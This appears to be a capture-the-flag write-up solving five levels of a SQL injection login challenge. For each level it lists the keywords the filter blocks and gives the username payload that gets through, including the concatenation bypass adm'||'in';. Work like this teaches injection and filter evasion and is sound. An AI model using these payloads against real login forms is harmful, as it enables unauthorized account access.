In the 1/5, it filters only "or"
So we can use admin'; as username and password is not important.
Username: admin';
Password: 123
2/5, filter "or and like = --"
1/5's payload is still useful.
Username: admin';
Password: 123
3/5, filter "or and = like > < --"
Still useful...
Username: admin';
Password: 123
4/5, filter "or and = like > < -- admin"
Eventually not useful, but we can use adm'||'in to bypass it.
Username: adm'||'in';
Password: 123
5/5, filter "or and = like > < -- union admin"
Still useful...
Username: adm'||'in';
Password: 123
Get the flag.

P.S. it didn't filter ";" so it's easy :p
